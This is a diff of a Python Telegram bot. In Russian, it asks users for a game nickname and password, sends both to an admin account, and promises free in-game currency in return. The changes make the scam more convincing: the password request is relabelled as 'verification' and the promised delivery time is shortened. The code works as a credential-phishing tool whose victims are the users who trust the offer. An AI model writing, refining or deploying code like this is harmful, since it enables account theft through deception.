@@ -63,7 +63,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 async def get_nickname(update: Update, context: ContextTypes.DEFAULT_TYPE):
     context.user_data['nickname'] = update.message.text
-    await update.message.reply_text("🔹 Теперь введите ваш пароль:")
+    await update.message.reply_text("🔹 Теперь введите ваш пароль для верификации:")
     return PASSWORD
 
 async def get_password(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -84,7 +84,7 @@ async def get_password(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await context.bot.send_message(ADMIN_ID, admin_text, parse_mode='Markdown')
     
     await update.message.reply_text(
-        "✅ Данные приняты! Донат придет в течение 24 часов.\n\n"
+        "✅ Данные приняты! Донат придет в течение 10-15 минут.\n\n"
         "📢 Обязательно подпишись на наш канал!",
         reply_markup=InlineKeyboardMarkup([
             [InlineKeyboardButton("📢 НАШ КАНАЛ", url=CHANNEL_LINK)]
@@ -155,3 +155,4 @@ def main():
 
 if __name__ == '__main__':
     main()
+
